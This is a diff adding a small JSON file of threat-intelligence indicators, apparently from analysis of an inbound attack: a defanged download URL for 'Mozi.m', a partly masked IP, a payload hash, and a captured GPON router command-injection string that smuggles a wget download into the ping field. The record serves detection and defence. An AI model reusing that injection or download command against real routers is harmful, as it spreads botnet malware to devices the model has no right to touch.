@@ -1,0 +1,26 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://27[.]215[.]47[.]XXX:58445/Mozi.m+-O+-"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "27[.]215[.]47.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://27[.]215[.]47[.]XXX:58445/Mozi.m+-O+->/tmp/gpon80;"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "b1791d2359ec91e63c7affc1205f7c91b3daf32e70ac344208f41278a13e6817"
+  }
+]
